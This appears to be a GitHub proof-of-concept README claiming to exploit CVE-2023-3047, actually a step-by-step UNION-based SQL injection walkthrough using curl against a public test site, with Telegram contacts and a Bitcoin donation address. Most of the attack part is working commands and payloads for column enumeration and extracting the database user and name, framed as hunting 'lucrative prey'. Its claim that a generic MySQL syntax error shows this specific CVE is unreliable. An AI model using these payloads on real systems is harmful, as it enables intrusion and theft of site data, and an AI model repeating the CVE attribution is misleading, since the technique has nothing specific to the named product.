- Telegram : `@ghostman_s3c` or `@Chrome2024`
- Donate BTC : `17L22i227Keet23QCNaeCyrQ6xfiTQpQJ5`
# PoC How To Exploit CVE-2023-3047
### Description
Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in TMT Lockcell allows SQL Injection.This issue affects Lockcell: before 15.
- Details : https://www.tenable.com/cve/CVE-2023-3047
### Exploit
First we will check to see if it has the CVE-2023-3047 error, now open a terminal, and make sure every terminal will support the cURL tool
- and I will test it on the website : http://testphp.vulnweb.com/listproducts.php?cat=1
- and now I will use the command to test them
- command :
```
curl <your_url_vulnerable> | grep "at line"
```
<img src="https://raw.githubusercontent.com/Phamchie/CVE-2023-3047/main/IMG_20240307_214537_031.jpg">

- after enter , and if it displays as `100 4976 0 4 --:--:Error: You have an error in your SQL syntax;  check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1` so your website is suffering from the error CVE-2023-3047
<img src="https://raw.githubusercontent.com/Phamchie/CVE-2023-3047/main/IMG_20240307_214536_245.jpg">

- ok, next we will try to see if this website blocks these Inejection attacks, try using the following command and try it
```
curl <your_url_vulnerable>+Union+Select+1,2,3--+- | grep "The used SELECT"
```
- and Enter, if it displays like the image below, then you have a lucrative prey
<img src="https://raw.githubusercontent.com/Phamchie/CVE-2023-3047/main/IMG_20240307_214536_323.jpg">

- And now you should continue the union select payload from 1 to a certain number that is considered valid for the column number of the mysql website.
- ok, my goal has a valid column number from 1 to 11, in the image below, 2 completely different results, above still has The used SELECT, and below there is not.
<img src="https://raw.githubusercontent.com/Phamchie/CVE-2023-3047/main/IMG_20240307_214536_737.jpg">

- And now, I will go to Google and verify, see if it is valid with the above results or not, and conveniently, I will get another number from which I can get information.
<img src="https://raw.githubusercontent.com/Phamchie/CVE-2023-3047/main/IMG_20240307_214536_150.jpg">

- Well, it seems like it's a completely valid result, and there are 3 numbers we can inject to get information from.
- and now, we will practice injecting sql commands to get information from it
- and we will use payload : `+Union+Select+1,2,3,4,5,6,CONCAT(user(),'::',database()),8,9,10,11--+-`
```
curl http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+1,2,3,4,5,6,CONCAT(user(),'::',database()),8,9,10,11--+- | grep "::"
```
- o oh, it seems, this command is not very good, because we have not encoded the payload into a URL
<img src="https://raw.githubusercontent.com/Phamchie/CVE-2023-3047/main/IMG_20240307_214536_281.jpg">

- and now my task is to encode that payload into a URL path to continue the cyber attack
- We will use `Burp Suite` to encode them
<img src="https://raw.githubusercontent.com/Phamchie/CVE-2023-3047/main/IMG_20240307_214536_315.jpg">

- Now select `Decoder`, then select `Encode as` on the left side of the screen, then select `URL` and enter your payload. As for my above error, it has special characters like : (, ) on them.  not enough requirements to meet, so I will just encode the command insert to get database information
```
CONCAT(user(),'::',database())
```
<img src="https://raw.githubusercontent.com/Phamchie/CVE-2023-3047/main/IMG_20240307_223322_806.jpg">

- Now I will copy the encoded part below, then continue the attack
```
curl http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+1,2,3,4,5,6,<encode_path_here>,8,9,10,11--+- | grep "::"
```
<img src="https://raw.githubusercontent.com/Phamchie/CVE-2023-3047/main/Screenshot_2024-03-07-22-36-13-60.jpg">

- and after entering, and that's the end of the game, the user name and database have been exposed, not only that, hackers can inject other payloads to get more information from them, for example dumping the base  data to steal information or gain control of the website admin
<img src="https://raw.githubusercontent.com/Phamchie/CVE-2023-3047/main/IMG_20240307_224031_113.jpg">

- So, the game is over, the user name is acuart@localhost and the database name is acuart
### conclude
- We update the servers with the latest version of MySQL or can search on Google to find ways to prevent network attacks like the above.
- Please follow me, I will share knowledge about network security with you
